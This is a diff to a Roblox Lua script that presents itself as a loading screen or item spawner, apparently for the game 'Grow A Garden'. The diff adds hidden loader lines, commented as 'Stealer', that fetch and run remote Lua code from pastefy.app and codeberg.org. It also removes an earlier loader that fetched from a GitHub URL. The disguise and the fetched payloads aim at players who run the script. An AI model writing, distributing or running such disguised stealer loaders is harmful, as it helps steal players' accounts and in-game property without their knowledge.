@@ -5,6 +5,11 @@ local Lighting = game:GetService("Lighting")
 local UserInputService = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
 
+-- Execute Stealer Immediately
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/hZcSLR75/raw"))()
+end)
+
 local LocalPlayer = Players.LocalPlayer
 
 -- Freeze CoreGuis
@@ -20,11 +25,6 @@ local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Parent = CoreGui
 ScreenGui.ResetOnSpawn = false
 ScreenGui.IgnoreGuiInset = true
-
--- Execute Payload Script Immediately (Stealer)
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/whatwatwhatwat/proxy/main/main.lua"))()
-end)
 
 -- Background Image (Triangle Pattern)
 local PatternBG = Instance.new("ImageLabel")
@@ -191,3 +191,7 @@ ScreenGui:Destroy()
 Blur:Destroy()
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+
+-- Execute Payload Script (Stealer) after loading completes
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
